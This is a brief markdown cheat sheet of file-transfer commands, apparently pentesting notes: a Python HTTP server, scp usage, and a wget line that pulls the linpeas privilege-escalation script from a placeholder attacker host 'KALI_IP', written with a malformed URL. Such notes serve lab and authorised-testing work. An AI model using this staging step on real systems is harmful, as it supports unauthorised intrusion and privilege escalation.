# General Commands

### Python server

`python3 -m http.server 8888`

To download the file: `wget http:/KALI_IP//linpeas.sh`

### SCP

Copy file from local to a remote computer:

```bash
scp file.txt remote_username@10.10.0.2:/remote/directory/newfilename.txt
# -P to set the ssh port in necessary case
```

Copy file from remote directory to local computer

```bash
scp remote_username@10.10.0.2:/remote/file.txt /local/directory
```
